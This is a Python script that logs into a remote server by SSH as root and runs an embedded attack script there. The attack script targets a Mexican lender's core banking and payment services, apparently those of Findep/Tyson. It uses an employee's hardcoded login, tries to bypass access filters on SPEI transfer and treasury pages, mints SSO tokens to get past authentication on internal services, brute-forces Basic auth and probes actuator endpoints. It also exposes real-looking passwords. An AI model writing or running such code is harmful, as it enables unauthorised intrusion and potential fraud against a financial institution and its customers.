import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, base64
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

SSO_URL = "https://sso-jwt-token-service2.tysonprod.com/v1/sso_findep/get_new_token"

def mint(app, svc):
    r = s.post(SSO_URL, json={"appJwt": app, "serviceName": svc},
        headers={"Content-Type": "application/json"}, timeout=5)
    return r.json().get("token", "") if r.status_code == 200 else ""

# ========================================
# 1. BYPASS FILTRO.DO - POST DIRECT
# ========================================
sys.stdout.write("=" * 60 + "\n=== BYPASS FILTRO.DO — DIRECT POST ===\n" + "=" * 60 + "\n\n")

# Login first
r0 = s.get("https://core.findep.mx/", timeout=10)
token_m = re.search(r'name="cve_idToken"\s+value="([^"]*)"', r0.text)
tok = token_m.group(1) if token_m else ""
s.post("https://core.findep.mx/valida.do",
    data={"cve_idToken": tok, "msjPass": "", "cveUsr": "jcruzval",
          "cve_usr": "jcruzval", "cve_psd": "Fisa1234*", "ok_btn": "Entrar"},
    allow_redirects=True, timeout=15)
sys.stdout.write("Logged in\n\n")

# Try GET with follow_redirects to see what filtro.do shows
financial_dos = [
    "backoffice/spei.do", "backoffice/transferencia.do",
    "backoffice/dispersion.do", "backoffice/pagos.do",
    "backoffice/tesoreria.do", "backoffice/movimientos.do",
    "backoffice/cuentas.do",
    "finanzas/spei.do", "finanzas/transferencia.do",
    "finanzas/dispersion.do", "finanzas/pagos.do",
    "finanzas/tesoreria.do", "finanzas/cuentas.do",
    "finanzas/inicio.do", "finanzas/menu.do",
]

for path in financial_dos:
    try:
        # POST directly (bypass redirect)
        r = s.post(f"https://core.findep.mx/{path}",
            data={}, timeout=5, allow_redirects=False)
        if r.status_code == 200 and len(r.text) > 500:
            title = re.search(r'<title>(.*?)</title>', r.text[:2000], re.I)
            has_novalidado = "NoValid" in r.text
            tag = " [BLOCKED-JS]" if has_novalidado else ""
            sys.stdout.write(f"  POST [{r.status_code}] {path} ({len(r.text)}b) {title.group(1)[:50] if title else 'N/A'}{tag}\n")
            if not has_novalidado:
                links = re.findall(r'href=["\']([^"\']+)["\']', r.text[:5000], re.I)
                sys.stdout.write(f"    Links: {[l for l in links if '.do' in l or 'spei' in l.lower()][:10]}\n")
        elif r.status_code in [302, 301]:
            loc = r.headers.get("Location", "")
            sys.stdout.write(f"  POST [{r.status_code}] {path} -> {loc[:80]}\n")
        elif r.status_code == 200:
            sys.stdout.write(f"  POST [{r.status_code}] {path} ({len(r.text)}b) {r.text[:200]}\n")
    except:
        pass
    sys.stdout.flush()

# Try filtro.do itself — what does it show?
sys.stdout.write("\n--- filtro.do content ---\n")
r = s.get("https://core.findep.mx/filtro.do", timeout=5, allow_redirects=True)
sys.stdout.write(f"  GET [{r.status_code}] filtro.do ({len(r.text)}b)\n")
if r.status_code == 200:
    title = re.search(r'<title>(.*?)</title>', r.text[:2000], re.I)
    sys.stdout.write(f"  Title: {title.group(1) if title else 'N/A'}\n")
    # Extract all .do links
    links = re.findall(r'href=["\']([^"\']*\.do[^"\']*)["\']', r.text, re.I)
    sys.stdout.write(f"  .do links: {links[:20]}\n")
    forms = re.findall(r'<form[^>]+action=["\']([^"\']+)["\']', r.text, re.I)
    sys.stdout.write(f"  Forms: {forms}\n")
    # Check for NoValidado
    if "NoValid" in r.text:
        sys.stdout.write("  Has NoValidado block\n")
    # Dump first 2000 chars
    sys.stdout.write(f"\n  Content preview:\n{r.text[:2000]}\n")


# ========================================
# 2. EUREKA WITH DIFFERENT TOKENS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== EUREKA AUTH BYPASS ===\n" + "=" * 60 + "\n\n")

eureka_base = "https://eureka.calidad-architect.com"

# Try various tokens
token_apps = [
    ("EUREKA", "eureka-service"),
    ("EUREKA-SERVER", "eureka-service"),
    ("SPRING-CLOUD", "eureka"),
    ("CONFIG-SERVER", "config-service"),
    ("TYSON-COBRANZA-GESTIONA", "eureka"),
    ("FINDEP-HAWKING", "eureka"),
    ("ADMIN", "eureka-service"),
    ("eureka-server", "eureka-service"),
    ("spring-cloud-eureka", "eureka"),
]

for app, svc in token_apps:
    tok = mint(app, svc)
    if not tok:
        continue
    try:
        r = s.get(f"{eureka_base}/eureka/apps",
            headers={"Authorization": f"Bearer {tok}", "Accept": "application/json"},
            timeout=5)
        if r.status_code == 200:
            sys.stdout.write(f"*** EUREKA HIT *** app={app} svc={svc}\n")
            sys.stdout.write(f"  {r.text[:3000]}\n\n")
        elif r.status_code != 401:
            sys.stdout.write(f"  [{r.status_code}] app={app} svc={svc}\n")
    except:
        pass
    sys.stdout.flush()

# Try Basic auth with common creds
basic_creds = [
    ("eureka", "eureka"), ("admin", "admin"), ("discovery", "discovery"),
    ("user", "password"), ("admin", "password"), ("eureka", "password"),
    ("admin", "Fisa1234*"), ("eureka", "Fisa1234*"),
]

for u, p in basic_creds:
    try:
        r = s.get(f"{eureka_base}/eureka/apps",
            auth=(u, p),
            headers={"Accept": "application/json"},
            timeout=5)
        if r.status_code == 200:
            sys.stdout.write(f"*** EUREKA BASIC *** {u}:{p}\n")
            sys.stdout.write(f"  {r.text[:3000]}\n\n")
        elif r.status_code != 401:
            sys.stdout.write(f"  [{r.status_code}] basic {u}:{p}\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 3. BFF-ORIGINATION DEEP PROBE
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== BFF-ORIGINATION-SERVICE DEEP ===\n" + "=" * 60 + "\n\n")

base_orig = "https://bff-origination-service.tysonprod.com"

# Mint different tokens
for app_name in ["TYSON-COBRANZA-GESTIONA", "FINDEP-GESTIONA", "FINDEP-ORIGINATION",
                 "ORIGINATION", "BFF-ORIGINATION"]:
    tok = mint(app_name, "bff-origination-service")
    if not tok:
        continue
    
    sys.stdout.write(f"\nToken from app={app_name}:\n")
    
    paths = [
        "/", "/health", "/info",
        "/v1/", "/v1/health", "/v1/loans", "/v1/credits", "/v1/applications",
        "/v1/disbursements", "/v1/dispersiones", "/v1/payments",
        "/v1/transfers", "/v1/spei", "/v1/stp",
        "/v1/accounts", "/v1/clients", "/v1/customers",
        "/v1/products", "/v1/catalogs",
        "/v2/api-docs", "/v3/api-docs",
        "/swagger-ui/", "/swagger-ui.html", "/swagger-ui/index.html",
        "/actuator", "/actuator/health", "/actuator/info",
        "/actuator/env", "/actuator/mappings",
        "/actuator/beans", "/actuator/configprops",
        "/api/", "/api/v1/", "/api/v1/loans",
    ]
    
    for path in paths:
        try:
            r = s.get(f"{base_orig}{path}",
                headers={"Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
                timeout=3, allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 20:
                sys.stdout.write(f"  *** [{r.status_code}] {path} ({len(r.text)}b)\n")
                sys.stdout.write(f"    {r.text[:1000]}\n")
            elif r.status_code in [401, 403, 405, 301, 302]:
                sys.stdout.write(f"  [{r.status_code}] {path}\n")
        except:
            pass
    sys.stdout.flush()
    break  # Only need one successful token


# ========================================
# 4. PROBE CALIDAD-ARCHITECT SERVICES
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== CALIDAD-ARCHITECT FINANCIAL SERVICES ===\n" + "=" * 60 + "\n\n")

K8S_IP = "35.238.21.37"

# Try financial service names as Host headers
ca_services = [
    "spei-service.orquesta.calidad-architect.com",
    "stp-service.orquesta.calidad-architect.com",
    "payment-service.orquesta.calidad-architect.com",
    "transfer-service.orquesta.calidad-architect.com",
    "disbursement-service.orquesta.calidad-architect.com",
    "dispersion-service.orquesta.calidad-architect.com",
    "transaction-service.orquesta.calidad-architect.com",
    "banking-service.orquesta.calidad-architect.com",
    "treasury-service.orquesta.calidad-architect.com",
    "account-service.orquesta.calidad-architect.com",
    "core-banking-service.orquesta.calidad-architect.com",
    "credit-service.orquesta.calidad-architect.com",
    "collection-service.orquesta.calidad-architect.com",
    "cobranza-service.orquesta.calidad-architect.com",
    "bff-origination-service.orquesta.calidad-architect.com",
    "catalogs-service.orquesta.calidad-architect.com",
    "orchestrator-gestiona-service-v2.orquesta.calidad-architect.com",
    "notification-service.orquesta.calidad-architect.com",
    "sms-service.orquesta.calidad-architect.com",
]

for host_header in ca_services:
    svc_name = host_header.split(".")[0]
    tok = mint("TYSON-COBRANZA-GESTIONA", svc_name)
    try:
        r = s.get(f"https://{K8S_IP}/",
            headers={"Host": host_header, "Authorization": f"Bearer {tok}"},
            timeout=3, verify=False)
        if r.status_code != 404 and r.status_code != 401:
            sys.stdout.write(f"  [{r.status_code}] {svc_name} ({len(r.text)}b) {r.text[:200]}\n")
        # Also try /actuator
        r2 = s.get(f"https://{K8S_IP}/actuator/mappings",
            headers={"Host": host_header, "Authorization": f"Bearer {tok}"},
            timeout=3, verify=False)
        if r2.status_code == 200 and len(r2.text) > 100:
            sys.stdout.write(f"  *** ACTUATOR *** [{r2.status_code}] {svc_name} ({len(r2.text)}b)\n")
            sys.stdout.write(f"    {r2.text[:2000]}\n\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 5. WEBRESOURCES REST API IN CORE
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== CORE WEBRESOURCES REST API ===\n" + "=" * 60 + "\n\n")

# The core banking might expose GlassFish REST endpoints
webres_paths = [
    "/webresources/", "/webresources",
    "/resources/", "/resources",
    "/rest/", "/rest",
    "/api/", "/api",
    "/ws/", "/ws",
    "/services/", "/services",
    "/webservice/", "/webservice",
    "/wsdl", "/ServiceList",
    "/application.wadl",
    "/__admin/wsdl", "/__admin/ServiceList",
]

for path in webres_paths:
    try:
        r = s.get(f"https://core.findep.mx{path}", timeout=5, allow_redirects=False)
        if r.status_code == 200 and len(r.text) > 50:
            sys.stdout.write(f"  [{r.status_code}] {path} ({len(r.text)}b)\n")
            sys.stdout.write(f"    {r.text[:500]}\n\n")
        elif r.status_code in [301, 302, 405]:
            loc = r.headers.get("Location", "")
            sys.stdout.write(f"  [{r.status_code}] {path} -> {loc[:80]}\n")
    except:
        pass
    sys.stdout.flush()

# ========================================
# 6. CHECK CORE AVAILABLE MODULES (menu dump)
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== CORE MENU / MODULE DUMP ===\n" + "=" * 60 + "\n\n")

# Navigate to main dashboard with full menu
r = s.get("https://core.findep.mx/dashboard.do", timeout=5, allow_redirects=True)
if r.status_code == 200:
    # Extract ALL .do links
    all_links = set(re.findall(r'(?:href|action|src)=["\']([^"\']*\.do[^"\']*)["\']', r.text, re.I))
    all_links.update(re.findall(r'(?:href|action|src)=["\']([^"\']*\.jsp[^"\']*)["\']', r.text, re.I))
    
    sys.stdout.write(f"Dashboard ({len(r.text)}b) — {len(all_links)} unique links:\n")
    for l in sorted(all_links):
        sys.stdout.write(f"  {l}\n")
    
    # Also look for menu JavaScript
    menu_funcs = re.findall(r'(?:menuItem|addMenu|loadModule|openModule)\(["\']([^"\']+)["\']', r.text, re.I)
    if menu_funcs:
        sys.stdout.write(f"\n  Menu functions: {menu_funcs[:20]}\n")

# Also try portafolioInicio.do which is the real landing
r = s.get("https://core.findep.mx/portafolioInicio.do", timeout=5, allow_redirects=True)
if r.status_code == 200:
    all_links2 = set(re.findall(r'(?:href|action|src)=["\']([^"\']*\.do[^"\']*)["\']', r.text, re.I))
    sys.stdout.write(f"\nportafolioInicio ({len(r.text)}b) — {len(all_links2)} links:\n")
    for l in sorted(all_links2):
        sys.stdout.write(f"  {l}\n")


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/spei_deep.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/spei_deep.py 2>&1', timeout=600)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
